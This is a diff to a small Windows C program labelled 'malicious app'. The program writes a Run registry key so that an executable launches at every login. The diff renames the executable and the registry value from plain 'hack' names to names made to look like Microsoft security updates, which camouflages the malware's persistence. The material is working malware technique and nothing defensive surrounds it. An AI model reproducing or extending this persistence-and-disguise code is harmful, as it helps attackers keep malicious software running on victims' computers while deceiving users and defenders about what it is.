@@ -10,13 +10,13 @@
 int main(int argc, char* argv[]) {
   HKEY hkey = NULL;
   // malicious app
-  const char* exe = "Z:\\hack.exe";
+  const char* exe = "Z:\\SecurityWindowsUpdate2025_April.exe";
 
   // startup
   LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
   if (result == ERROR_SUCCESS) {
     // create new registry key
-    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
+    RegSetValueEx(hkey, (LPCSTR)"MicrosoftPatchUpdateApril_v13.04.3434343", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
     RegCloseKey(hkey);
   }
   return 0;
